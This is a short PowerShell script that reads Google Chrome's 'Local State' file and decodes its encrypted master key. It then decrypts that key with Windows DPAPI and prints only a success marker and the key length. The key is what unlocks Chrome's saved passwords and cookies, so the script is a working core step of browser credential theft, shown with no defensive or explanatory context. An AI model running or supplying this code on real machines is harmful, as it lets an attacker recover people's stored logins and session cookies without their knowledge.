Add-Type -AssemblyName System.Security
$localStatePath = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Local State'
$state = Get-Content $localStatePath -Raw | ConvertFrom-Json
$enc = [Convert]::FromBase64String($state.os_crypt.encrypted_key)
$enc2 = $enc[5..($enc.Length-1)]
$dec = [System.Security.Cryptography.ProtectedData]::Unprotect($enc2, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
Write-Host ('OK:' + $dec.Length)
